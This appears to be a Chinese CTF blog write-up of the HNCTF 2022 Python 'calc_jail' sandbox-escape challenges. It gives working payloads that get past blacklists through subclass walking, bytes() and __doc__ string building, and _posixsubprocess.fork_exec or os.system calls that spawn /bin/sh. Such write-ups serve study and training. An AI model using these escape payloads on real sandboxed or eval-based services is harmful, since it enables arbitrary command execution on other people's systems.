+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230731214138100.png" alt="image-20230731214138100"></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230731214206969.png" alt="image-20230731214206969"></p>
+<p><strong>NSSCTF{4e28ebac-4a64-4205-8853-b49286703415}</strong></p>
+<h2 id="HNCTF-2022-WEEK2-calc-jail-beginner-level4-JAIL、bytes-decode-、-doc"><a href="#HNCTF-2022-WEEK2-calc-jail-beginner-level4-JAIL、bytes-decode-、-doc" class="headerlink" title="[HNCTF 2022 WEEK2]calc_jail_beginner_level4(JAIL、bytes([]).decode() 、__doc__)"></a>[HNCTF 2022 WEEK2]calc_jail_beginner_level4(JAIL、bytes([]).decode() 、<code>__doc__</code>)</h2><p>查看源码</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230801201356423.png" alt="image-20230801201356423"></p>
+<p>将<code>&#39;__loader__&#39;, &#39;__import__&#39;, &#39;compile&#39;, &#39;eval&#39;, &#39;exec&#39;, &#39;chr&#39;</code>等函数都ban掉了 后面又将单引号、双引号、反斜杠、反引号给ban了</p>
+<p>因为ban掉了<code>__import__</code>之前提到的help()和breakpoint()都没有办法使用 但是并没有ban掉其余的字母</p>
+<h3 id="方法一：-1"><a href="#方法一：-1" class="headerlink" title="方法一："></a>方法一：</h3><p>尝试使用之前的SSTI注入 先查询object类下的子类  查看可以使用的模块</p>
+<pre><code>().__class__.__base__.__subclasses__()
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230801223643348.png" alt="image-20230801223643348"></p>
+<p>并没有过滤模块 os模块还可以使用 虽然禁用了<code>chr()</code>函数 但是bytes()函数也可以构造字符串 下面是转化过程：</p>
+<pre><code>().__class__.__base__.__subclasses__()[-4].__init__.__globals__[&#39;system&#39;](&#39;sh&#39;)
+
+转化为
+
+().__class__.__base__.__subclasses__()[-4].__init__.__globals__[bytes([115,121,115,116,101,109]).decode()](bytes([115,104]).decode())
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230801225100070.png" alt="image-20230801225100070"></p>
+<h3 id="方法二：-1"><a href="#方法二：-1" class="headerlink" title="方法二："></a>方法二：</h3><p>同样是使用bytes()函数 猜测flag文件的位置和名字 可以直接对 <code>open(&#39;flag&#39;).read()</code>进行转化  直接读取flag</p>
+<pre><code>open(bytes([102,108,97,103]).decode()).read()
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230801225252004.png" alt="image-20230801225252004"></p>
+<h3 id="方法三："><a href="#方法三：" class="headerlink" title="方法三："></a>方法三：</h3><p>像一些默认类，如：str、dict、list等，都会有相应的文档。这时可以直接从<code>__doc__</code>里面去找，用索引的方式获得想要的字符，并拼接再一起，得到想要的字符串。</p>
+<p>在这里 我们使用列表这个类来查找字符</p>
+<pre><code class="python">print([].__doc__)
+
+&#39;&#39;&#39;
+输出：
+Built-in mutable sequence.
+
+If no argument is given, the constructor creates a new empty list.
+The argument must be an iterable if specified.
+&#39;&#39;&#39;
+</code></pre>
+<p>使用find命令查找字符下标</p>
+<pre><code class="python">print([].__doc__.find(&#39;s&#39;))
+&#39;&#39;&#39;
+输出：
+17
+&#39;&#39;&#39;
+</code></pre>
+<p>那么可以使用下标进行拼接system和sh函数</p>
+<pre><code class="python"># system
+[].__doc__[17]+[].__doc__[87]+[].__doc__[17]+[].__doc__[4]+[].__doc__[15]+[].__doc__[9]
+# sh
+[].__doc__[17]+[].__doc__[54]
+</code></pre>
+<p>下面是转换过程</p>
+<pre><code class="python">().__class__.__base__.subclasses__()[-4].__init__.__globals__[&#39;system&#39;].(&#39;sh&#39;)
+
+().__class__.__base__.__subclasses__()[-4].__init__.__globals__[[].__doc__[17]+[].__doc__[87]+[].__doc__[17]+[].__doc__[4]+[].__doc__[15]+[].__doc__[9]]([].__doc__[17]+[].__doc__[54])
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230801231059013.png" alt="image-20230801231059013"></p>
+<h3 id="HNCTF-2022-WEEK2-calc-jail-beginner-level4-0-5-JAIL"><a href="#HNCTF-2022-WEEK2-calc-jail-beginner-level4-0-5-JAIL" class="headerlink" title="[HNCTF 2022 WEEK2]calc_jail_beginner_level4.0.5(JAIL)"></a>[HNCTF 2022 WEEK2]calc_jail_beginner_level4.0.5(JAIL)</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230804204635253.png" alt="image-20230804204635253"></p>
+<p>在题干处给出ban掉了<code>__loader__,__import__,compile,eval,exec,chr,input,locals,globals and </code>,”,’ &#96;</p>
+<p>同level4 三种方法任选其一即可</p>
+<p><strong>NSSCTF{58d8ebf7-2162-4bdb-a2a6-98515e0871bc}</strong></p>
+<h2 id="HNCTF-2022-WEEK2-calc-jail-beginner-level4-1-JAIL-下标索引-bytes"><a href="#HNCTF-2022-WEEK2-calc-jail-beginner-level4-1-JAIL-下标索引-bytes" class="headerlink" title="[HNCTF 2022 WEEK2]calc_jail_beginner_level4.1(JAIL 下标索引 bytes())"></a>[HNCTF 2022 WEEK2]calc_jail_beginner_level4.1(JAIL 下标索引 bytes())</h2><p>在题干处给出提示 ban掉了<code>__loader__,__import__,compile,eval,exec,chr,input,locals,globals,bytes and</code>,”,’&#96;</p>
+<p>与上两题不同 这次将<code>bytes</code>也ban掉了 第二种和第一种方法就没法使用了</p>
+<p>但是第三种方法还是可以使用的  </p>
+<p>这里仿照第一种方法的形式 先查看object下的所有子类 发现<code>bytes</code>的下标索引是6  因此可以进行利用</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230804220530811.png" alt="image-20230804220530811"></p>
+<pre><code>().__class__.__base__.__subclasses__()[-4].__init__.__globals__[bytes([115,121,115,116,101,109]).decode()](bytes([115,104]).decode())
+
+转化为
+
+().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__class__.__base__.__subclasses__()[6]([115,121,115,116,101,109]).decode()](().__class__.__base__.__subclasses__()[6]([115,104]).decode())
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230804221050269.png" alt="image-20230804221050269"></p>
+<p><strong>NSSCTF{006582c3-2430-49d8-9cee-b631c7aed4dc}</strong></p>
+<h2 id="HNCTF-2022-WEEK2-calc-jail-beginner-level4-2-JAIL"><a href="#HNCTF-2022-WEEK2-calc-jail-beginner-level4-2-JAIL" class="headerlink" title="[HNCTF 2022 WEEK2]calc_jail_beginner_level4.2(JAIL)"></a>[HNCTF 2022 WEEK2]calc_jail_beginner_level4.2(JAIL)</h2><p>同level4.1 </p>
+<pre><code>().__class__.__base__.__subclasses__()[-4].__init__.__globals__[().__class__.__base__.__subclasses__()[6]([115,121,115,116,101,109]).decode()](().__class__.__base__.__subclasses__()[6]([115,104]).decode())
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230804225030885.png" alt="image-20230804225030885"></p>
+<p><strong>NSSCTF{ab748a53-bafc-41cb-bb20-b22b025fdb8e}</strong></p>
+<h2 id="HNCTF-2022-WEEK2-calc-jail-beginner-level4-3-JAIL-str-join拼接字符"><a href="#HNCTF-2022-WEEK2-calc-jail-beginner-level4-3-JAIL-str-join拼接字符" class="headerlink" title="[HNCTF 2022 WEEK2]calc_jail_beginner_level4.3(JAIL str().join拼接字符)"></a>[HNCTF 2022 WEEK2]calc_jail_beginner_level4.3(JAIL str().join拼接字符)</h2><p>这里看题干知道 除了ban掉上一题的内容还ban掉了<code>+</code>  其实使用上一题的payload是完全没问题的</p>
+<p>禁用<code>+</code> 但是我们还可以使用<code>john()</code>函数进行拼接 </p>
+<pre><code>&#39;&#39;.join([&#39;s&#39;, &#39;y&#39;, &#39;s&#39;, &#39;t&#39;, &#39;e&#39;, &#39;m&#39;])
+</code></pre>
+<p>这样就能得到system 但是双引号也被ban掉了 我们可以使用<code>str()</code>这个函数 就相当于一个双引号 </p>
+<pre><code>str().join([&#39;s&#39;, &#39;y&#39;, &#39;s&#39;, &#39;t&#39;, &#39;e&#39;, &#39;m&#39;])
+</code></pre>
+<p>由此可以得到payload</p>
+<pre><code>().__class__.__base__.__subclasses__()[-4].__init__.__globals__[[].__doc__[17]+[].__doc__[87]+[].__doc__[17]+[].__doc__[4]+[].__doc__[15]+[].__doc__[9]]([].__doc__[17]+[].__doc__[54])
+
+().__class__.__base__.__subclasses__()[-4].__init__.__globals__[str().join([[].__doc__[17],[].__doc__[87],[].__doc__[17],[].__doc__[4],[].__doc__[15],[].__doc__[9]])](str().join([[].__doc__[17],[].__doc__[54]]))
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230805221344148.png" alt="image-20230805221344148"></p>
+<p><strong>NSSCTF{b13441a1-e6e1-4ab0-968c-f80170f5925f}</strong></p>
+<h2 id="HNCTF-2022-WEEK2-calc-jail-beginner-level5-dir"><a href="#HNCTF-2022-WEEK2-calc-jail-beginner-level5-dir" class="headerlink" title="[HNCTF 2022 WEEK2]calc_jail_beginner_level5(dir())"></a>[HNCTF 2022 WEEK2]calc_jail_beginner_level5(dir())</h2><p>并没有ban掉什么内容  提示flag在dir()里面</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230805131907416.png" alt="image-20230805131907416"></p>
+<p>其实直接使用最开始的SSTI注入 就可以直接进入交互模式</p>
+<pre><code>().__class__.__base__.__subclasses__()[-6].__init__.__globals__[&#39;system&#39;](&#39;sh&#39;)
+</code></pre>
+<p>或者直接进行rce</p>
+<pre><code>__import__(&#39;os&#39;).system(&#39;cat flag&#39;)
+</code></pre>
+<p>但是这里我们选择使用dir()来解决题目</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230805134401775.png" alt="image-20230805134401775"></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230805134321794.png" alt="image-20230805134321794"></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230805134347519.png" alt="image-20230805134347519"></p>
+<p>发现<code>encode</code>函数可以使用</p>
+<pre><code>my_flag.flag_level5.encode()
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230805135450313.png" alt="image-20230805135450313"></p>
+<p>来看一下源码</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230805140540826.png" alt="image-20230805140540826"></p>
+<h2 id="HNCTF-2022-WEEK2-calc-jail-beginner-level5-1"><a href="#HNCTF-2022-WEEK2-calc-jail-beginner-level5-1" class="headerlink" title="[HNCTF 2022 WEEK2]calc_jail_beginner_level5.1"></a>[HNCTF 2022 WEEK2]calc_jail_beginner_level5.1</h2><p>同level5 只是这次有了一些黑名单的过滤</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230805135908651.png" alt="image-20230805135908651"></p>
+<p>可以使用SSTI注入进入交互模式 也可以直接使用dir()拿到flag</p>
+<p><strong>NSSCTF{6e6ce512-08e0-4792-9d14-cb41370382b2}</strong></p>
+<h2 id="HNCTF-2022-WEEK3-calc-jail-beginner-level6-JAIL-posixsubprocess-fork-exec-lamba表达式"><a href="#HNCTF-2022-WEEK3-calc-jail-beginner-level6-JAIL-posixsubprocess-fork-exec-lamba表达式" class="headerlink" title="[HNCTF 2022 WEEK3]calc_jail_beginner_level6(JAIL _posixsubprocess.fork_exec lamba表达式)"></a>[HNCTF 2022 WEEK3]calc_jail_beginner_level6(JAIL _posixsubprocess.fork_exec lamba表达式)</h2><p>这次是给出了白名单 只有在白名单中的函数才可以使用 <code>builtins.input,builtins.input/result,exec,compile</code></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230805171210883.png" alt="image-20230805171210883"></p>
+<h3 id="方法一：-2"><a href="#方法一：-2" class="headerlink" title="方法一："></a>方法一：</h3><p>这里需要使用<code>_posixsubprocess.fork_exec</code></p>
+<p>首先将<code>_posixsubprocess</code>类导进去 <code>import</code>使用不了 但是<code>__builtins__</code>还是可以使用的</p>
+<pre><code class="python">__builtins__[&#39;__loader__&#39;].load_module(&#39;_posixsubprocess&#39;)
+或：
+__loader__.load_module(&#39;_posixsubprocess&#39;)
+</code></pre>
+<p>下面是完整的payload</p>
+<pre><code>import os
+__loader__.load_module(&#39;_posixsubprocess&#39;).fork_exec([b&quot;/bin/sh&quot;], [b&quot;/bin/sh&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None)
+</code></pre>
+<p>进入shell界面 读取flag就好(虽然会在shell和python界面来回切换)</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230805172325862.png" alt="image-20230805172325862"></p>
+<p><strong>NSSCTF{a7586393-169d-4daf-abcf-db107c89c33a}</strong></p>
+<h3 id="方法二：-2"><a href="#方法二：-2" class="headerlink" title="方法二："></a>方法二：</h3><pre><code>exec(&quot;globals()[&#39;__builtins__&#39;][&#39;set&#39;]=lambda x: [&#39;builtins.input&#39;, &#39;builtins.input/result&#39;,&#39;exec&#39;, &#39;compile&#39;, &#39;os.system&#39;]\nimport os\nos.system(&#39;/bin/sh&#39;)&quot;)
+</code></pre>
+<h2 id="HNCTF-2022-WEEK3-calc-jail-beginner-level6-1-海象运算符、列表、无限迭代器"><a href="#HNCTF-2022-WEEK3-calc-jail-beginner-level6-1-海象运算符、列表、无限迭代器" class="headerlink" title="[HNCTF 2022 WEEK3]calc_jail_beginner_level6.1(海象运算符、列表、无限迭代器)"></a>[HNCTF 2022 WEEK3]calc_jail_beginner_level6.1(海象运算符、列表、无限迭代器)</h2><p>给了部分源码</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230805200804050.png" alt="image-20230805200804050"></p>
+<p>这次只能进行一次代码执行操作 使用到一个运算符<code>海象运算符</code></p>
+<pre><code>:=
+海象运算符的优势在于能在不允许赋值的地方（如if语句的条件表达式中）使用赋值变量。海象运算符左侧有个标识符，赋值表达式的值等于分配给这个标识符的值
+</code></pre>
+<pre><code>[os := __import__(&#39;os&#39;), _posixsubprocess := __loader__.load_module(&#39;_posixsubprocess&#39;), _posixsubprocess.fork_exec([b&quot;/bin/sh&quot;], [b&quot;/bin/sh&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None)]
+</code></pre>
+<p>上一步就是实现level6的payload 先导入os模块 再导入<code>_posixsubprocess</code>模块 在使用<code>_posixsubprocess</code>模块</p>
+<p>但是shell只显示一次shell 就退掉了 因此要使用无线迭代器<code>itertools</code></p>
+<pre><code>[os := __import__(&#39;os&#39;), itertools := __loader__.load_module(&#39;itertools&#39;), _posixsubprocess := __loader__.load_module(&#39;_posixsubprocess&#39;), [_posixsubprocess.fork_exec([b&quot;/bin/sh&quot;], [b&quot;/bin/sh&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False, None, None, None, -1, None) for i in itertools.count(0)]]
+</code></pre>
+<p>输入payload之后 会不停的重放&#x2F;bin&#x2F;sh  说是无限迭代器 但其实也有次数 手速要快  输入<code> ls cat flag</code> 即可得到flag</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230805213426632.png" alt="image-20230805213426632"></p>
+<p><strong>NSSCTF{0047e0c3-4c98-4795-aa7f-6e522649c3d6}</strong></p>
+<h2 id="HNCTF-2022-WEEK3-calc-jail-beginner-level7-函数装饰器、类的定义"><a href="#HNCTF-2022-WEEK3-calc-jail-beginner-level7-函数装饰器、类的定义" class="headerlink" title="[HNCTF 2022 WEEK3]calc_jail_beginner_level7(函数装饰器、类的定义)"></a>[HNCTF 2022 WEEK3]calc_jail_beginner_level7(函数装饰器、类的定义)</h2><p>给了一个窗口  先查看黑名单</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230805214036074.png" alt="image-20230805214036074"></p>
+<p>输入<code>E</code> 可以输入多行命令 但是要求结尾必须是<code>--HNCTF</code></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230805214119619.png" alt="image-20230805214119619"></p>
+<p>这时候可以使用函数装饰器<code>@</code> 和类的定义</p>
+<pre><code>@exec
+@input
+class A: pass
+</code></pre>
+<p>前两个是函数装饰器: <font color='red'>把带有@的函数放到某个函数的定义处，相当于执行了一次@后的函数</font></p>
+<p>后面是类定义 这里的<code>pass</code>主要作用是占据位置  让代码整体完整 定义空类会报错 </p>
+<p>成功进入main函数主体  在执行命令 进入shell即可</p>
+<pre><code>__import__(&#39;os&#39;).system(&#39;sh&#39;)
+</code></pre>
+<p>读到flag</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230805221429156.png" alt="image-20230805221429156"></p>
+<p>下面是源码</p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230805215144009.png" alt="image-20230805215144009"></p>
+<p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/image/image-20230805215207054.png" alt="image-20230805215207054"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://w3nx1z1.github.io">w3nx1z1</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://w3nx1z1.github.io/posts/235901d1.html">http://w3nx1z1.github.io/posts/235901d1.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://w3nx1z1.github.io" target="_blank">w3nx1z1</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/misc/">misc</a><a class="post-meta__tags" href="/tags/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/">沙箱逃逸</a></div><div class="post_share"><div class="social-share" data-image="/img/mikey.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/96c5cf9c.html" title="2023蓝帽杯初赛取证wp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">2023蓝帽杯初赛取证wp</div></div></a></div><div class="next-post pull-right"><a href="/posts/ca7efdd6.html" title="春苗进阶考核实操"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">春苗进阶考核实操</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/1993ae4b.html" title="2023巅峰极客MISC题解"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-21</div><div class="title">2023巅峰极客MISC题解</div></div></a></div><div><a href="/posts/352a8c69.html" title="2024古剑山"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-02-08</div><div class="title">2024古剑山</div></div></a></div><div><a href="/posts/9b920400.html" title="2023年中国工业互联网安全大赛决赛-misc"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-03</div><div class="title">2023年中国工业互联网安全大赛决赛-misc</div></div></a></div><div><a href="/posts/f5b0b099.html" title="2023年陕西省赛"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-06-03</div><div class="title">2023年陕西省赛</div></div></a></div><div><a href="/posts/b645f749.html" title="2023愚人杯misc wp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-13</div><div class="title">2023愚人杯misc wp</div></div></a></div><div><a href="/posts/b348ce4d.html" title="2023极客大挑战"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-04-01</div><div class="title">2023极客大挑战</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/mikey.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="avatar"/></div><div class="author-info__name">w3nx1z1</div><div class="author-info__description">你相信引力吗？</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">68</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">11</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/w3nx1z1"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/w3nx1z1" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:1281027651@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a><a class="social-icon" href="http://wpa.qq.com/msgrd?v=3&amp;uin=1281027651&amp;site=qq&amp;menu=yes" target="_blank" title="QQ"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到w3nx1z1的博客!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%9D%E8%AF%86%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="toc-text">初识沙箱逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#HNCTF-2022-Week1-calc-jail-beginner-level-JAIL-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8"><span class="toc-text">[HNCTF 2022 Week1]calc_jail_beginner_level(JAIL 沙箱逃逸)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HNCTF-2022-Week1-calc-jail-beginner-level1-JAIL-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8-chr-SSTI%E6%B3%A8%E5%85%A5"><span class="toc-text">[HNCTF 2022 Week1]calc_jail_beginner_level1(JAIL 沙箱逃逸 chr() SSTI注入)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A"><span class="toc-text">方法一：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A"><span class="toc-text">方法二：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89"><span class="toc-text">方法三</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HNCTF-2022-Week1-calc-jail-beginner-level2-JAIL-%E5%8F%82%E6%95%B0%E9%80%83%E9%80%B8"><span class="toc-text">[HNCTF 2022 Week1]calc_jail_beginner_level2(JAIL 参数逃逸)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HNCTF-2022-Week1-calc-jail-beginner-level2-5-JAIL-breakpoint"><span class="toc-text">[HNCTF 2022 Week1]calc_jail_beginner_level2.5(JAIL breakpoint())</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HNCTF-2022-Week1-calc-jail-beginner-level3-JAIL-help"><span class="toc-text">[HNCTF 2022 Week1]calc_jail_beginner_level3(JAIL help())</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HNCTF-2022-WEEK2-calc-jail-beginner-level4-JAIL%E3%80%81bytes-decode-%E3%80%81-doc"><span class="toc-text">[HNCTF 2022 WEEK2]calc_jail_beginner_level4(JAIL、bytes([]).decode() 、__doc__)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A-1"><span class="toc-text">方法一：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A-1"><span class="toc-text">方法二：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89%EF%BC%9A"><span class="toc-text">方法三：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HNCTF-2022-WEEK2-calc-jail-beginner-level4-0-5-JAIL"><span class="toc-text">[HNCTF 2022 WEEK2]calc_jail_beginner_level4.0.5(JAIL)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HNCTF-2022-WEEK2-calc-jail-beginner-level4-1-JAIL-%E4%B8%8B%E6%A0%87%E7%B4%A2%E5%BC%95-bytes"><span class="toc-text">[HNCTF 2022 WEEK2]calc_jail_beginner_level4.1(JAIL 下标索引 bytes())</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HNCTF-2022-WEEK2-calc-jail-beginner-level4-2-JAIL"><span class="toc-text">[HNCTF 2022 WEEK2]calc_jail_beginner_level4.2(JAIL)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HNCTF-2022-WEEK2-calc-jail-beginner-level4-3-JAIL-str-join%E6%8B%BC%E6%8E%A5%E5%AD%97%E7%AC%A6"><span class="toc-text">[HNCTF 2022 WEEK2]calc_jail_beginner_level4.3(JAIL str().join拼接字符)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HNCTF-2022-WEEK2-calc-jail-beginner-level5-dir"><span class="toc-text">[HNCTF 2022 WEEK2]calc_jail_beginner_level5(dir())</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HNCTF-2022-WEEK2-calc-jail-beginner-level5-1"><span class="toc-text">[HNCTF 2022 WEEK2]calc_jail_beginner_level5.1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HNCTF-2022-WEEK3-calc-jail-beginner-level6-JAIL-posixsubprocess-fork-exec-lamba%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-text">[HNCTF 2022 WEEK3]calc_jail_beginner_level6(JAIL _posixsubprocess.fork_exec lamba表达式)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A-2"><span class="toc-text">方法一：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C%EF%BC%9A-2"><span class="toc-text">方法二：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HNCTF-2022-WEEK3-calc-jail-beginner-level6-1-%E6%B5%B7%E8%B1%A1%E8%BF%90%E7%AE%97%E7%AC%A6%E3%80%81%E5%88%97%E8%A1%A8%E3%80%81%E6%97%A0%E9%99%90%E8%BF%AD%E4%BB%A3%E5%99%A8"><span class="toc-text">[HNCTF 2022 WEEK3]calc_jail_beginner_level6.1(海象运算符、列表、无限迭代器)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HNCTF-2022-WEEK3-calc-jail-beginner-level7-%E5%87%BD%E6%95%B0%E8%A3%85%E9%A5%B0%E5%99%A8%E3%80%81%E7%B1%BB%E7%9A%84%E5%AE%9A%E4%B9%89"><span class="toc-text">[HNCTF 2022 WEEK3]calc_jail_beginner_level7(函数装饰器、类的定义)</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/6f5a3cd.html" title="2025启航杯wp">2025启航杯wp</a><time datetime="2025-01-25T15:56:54.364Z" title="发表于 2025-01-25 23:56:54">2025-01-25</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/2f21d3bc.html" title="2025龙信考核比武">2025龙信考核比武</a><time datetime="2025-01-11T01:20:22.398Z" title="发表于 2025-01-11 09:20:22">2025-01-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/67db48b9.html" title="2024冀信杯决赛">2024冀信杯决赛</a><time datetime="2025-01-10T16:54:11.458Z" title="发表于 2025-01-11 00:54:11">2025-01-11</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/5b3dd75d.html" title="DASCTF 2024最后一战 | Misc">DASCTF 2024最后一战 | Misc</a><time datetime="2025-01-08T10:00:09.647Z" title="发表于 2025-01-08 18:00:09">2025-01-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/90927854.html" title="w3nx1z1的2024年度个人总结">w3nx1z1的2024年度个人总结</a><time 